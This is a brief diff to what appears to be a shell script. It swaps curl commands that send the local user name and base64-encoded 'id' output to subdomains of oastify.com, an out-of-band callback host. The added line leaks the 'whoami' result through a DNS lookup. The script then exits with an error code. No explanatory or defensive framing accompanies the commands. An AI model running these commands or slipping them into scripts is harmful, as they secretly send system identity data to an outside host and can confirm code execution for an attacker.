@@ -1,3 +1,2 @@
-curl http://lwl8e40a09jdxylfs6hefcs9k0qrej28.oastify.com/$(id | base64 | tr -d '\n')
-curl $(whoami).lwl8e40a09jdxylfs6hefcs9k0qrej28.oastify.com
+curl $(whoami).7hpi2myxjznztydrr24i7n26bxho5mtb.oastify.com
 exit 1
